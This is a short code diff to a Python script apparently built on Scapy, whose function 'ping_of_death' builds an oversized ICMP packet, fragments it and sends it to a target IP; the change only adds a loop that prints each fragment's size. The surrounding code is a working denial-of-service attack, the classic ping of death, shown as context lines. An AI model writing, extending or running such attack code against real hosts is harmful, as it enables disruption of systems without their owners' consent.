@@ -15,6 +15,9 @@ def ping_of_death(target_ip):
     packet = ip / icmp / payload
     fragmented_packet = fragment(packet)
 
+    for frag in fragmented_packet:
+        print(f"Sending fragment with size: {len(frag)} bytes")
+
     send(fragmented_packet)
 
 
